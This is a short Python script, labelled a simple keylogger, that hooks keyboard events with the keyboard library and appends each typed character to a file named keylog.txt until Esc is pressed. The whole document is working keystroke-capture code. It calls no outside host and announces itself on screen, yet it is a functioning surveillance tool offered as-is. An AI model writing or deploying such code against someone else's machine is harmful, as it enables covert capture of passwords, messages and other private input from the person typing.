#simple keylogger

import keyboard

def log_keystrokes(event):
    key = event.name
    if len(key) == 1:  # Ignore special keys like 'Ctrl', 'Shift', etc.
        with open("keylog.txt", "a") as f:
            f.write(key)

def main():
    print("Keylogger started. Press 'Esc' to stop.")
    keyboard.on_release(log_keystrokes)
    keyboard.wait('esc')

    print("Keylogger stopped.")
    keyboard.unhook_all()

if __name__ == "__main__":
    main()
